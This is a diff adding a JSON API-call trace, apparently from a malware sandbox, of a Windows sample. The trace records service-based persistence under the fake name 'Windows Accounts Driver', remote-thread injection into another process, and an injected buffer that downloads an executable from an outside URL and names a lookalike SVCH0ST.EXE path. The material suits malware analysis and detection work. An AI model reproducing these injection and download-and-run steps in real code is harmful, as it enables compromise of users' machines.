@@ -1,0 +1,123 @@
+[
+    {
+        "api": "NtProtectVirtualMemory",
+        "arguments": {
+            "process_identifier": 6148,
+            "stack_dep_bypass": 0,
+            "stack_pivoted": 0,
+            "heap_dep_bypass": 0,
+            "length": 4096,
+            "protection": 64,
+            "process_handle": "0xffffffff",
+            "base_address": "0x75f1d000"
+        }
+    },
+    {
+        "api": "NtProtectVirtualMemory",
+        "arguments": {
+            "process_identifier": 6148,
+            "stack_dep_bypass": 0,
+            "stack_pivoted": 0,
+            "heap_dep_bypass": 0,
+            "length": 4096,
+            "protection": 64,
+            "process_handle": "0xffffffff",
+            "base_address": "0x74391000"
+        }
+    },
+    {
+        "api": "CreateServiceA",
+        "arguments": {
+            "service_start_name": "",
+            "start_type": 2,
+            "service_handle": "0x0063ec60",
+            "display_name": "Windows Accounts Driver",
+            "error_control": 0,
+            "service_name": "windows_0",
+            "filepath": "C:\\Windows\\System32\\1363.exe",
+            "filepath_r": "C:\\Windows\\system32\\1363.exe",
+            "service_manager_handle": "0x0063eaf8",
+            "desired_access": 983551,
+            "service_type": 16,
+            "password": ""
+        }
+    },
+    {
+        "api": "LookupPrivilegeValueW",
+        "arguments": {
+            "system_name": "",
+            "privilege_name": "SeDebugPrivilege"
+        }
+    },
+    {
+        "api": "NtAllocateVirtualMemory",
+        "arguments": {
+            "process_identifier": 3512,
+            "region_size": 8192,
+            "stack_dep_bypass": 0,
+            "stack_pivoted": 0,
+            "heap_dep_bypass": 0,
+            "protection": 64,
+            "process_handle": "0x00000244",
+            "allocation_type": 4096,
+            "base_address": "0x030d0000"
+        }
+    },
+    {
+        "api": "CreateRemoteThread",
+        "arguments": {
+            "thread_identifier": 0,
+            "process_identifier": 3512,
+            "function_address": "0x030d0000",
+            "flags": 0,
+            "process_handle": "0x00000244",
+            "parameter": "0x030f0000",
+            "stack_size": 0
+        }
+    },
+    {
+        "api": "NtAllocateVirtualMemory",
+        "arguments": {
+            "process_identifier": 3512,
+            "region_size": 8192,
+            "stack_dep_bypass": 0,
+            "stack_pivoted": 0,
+            "heap_dep_bypass": 0,
+            "protection": 64,
+            "process_handle": "0x00000244",
+            "allocation_type": 4096,
+            "base_address": "0x030d0000"
+        }
+    },
+    {
+        "api": "NtAllocateVirtualMemory",
+        "arguments": {
+            "process_identifier": 3512,
+            "region_size": 4096,
+            "stack_dep_bypass": 0,
+            "stack_pivoted": 0,
+            "heap_dep_bypass": 0,
+            "protection": 4,
+            "process_handle": "0x00000244",
+            "allocation_type": 4096,
+            "base_address": "0x030f0000"
+        }
+    },
+    {
+        "api": "WriteProcessMemory",
+        "arguments": {
+            "process_identifier": 3512,
+            "buffer": "\u00d0\u000b\u00fauP\u00f5\u00f9u\u0090-\u00fbu\u0000\u000f\u00fau\u0000A\u00fauurlmon.dll\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000URLDownloadToFileA\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000http://www.jyfish.com/khhm.exe\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000C:\\Windows\\system32\\SVCH0ST.EXE\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u00c0\u00d4\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000D\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+            "process_handle": "0x00000244",
+            "base_address": "0x030f0000"
+        }
+    },
+    {
+        "api": "NtResumeThread",
+        "arguments": {
+            "thread_handle": "0x000002d8",
+            "suspend_count": 1,
+            "process_identifier": 1072
+        }
+    }
+]
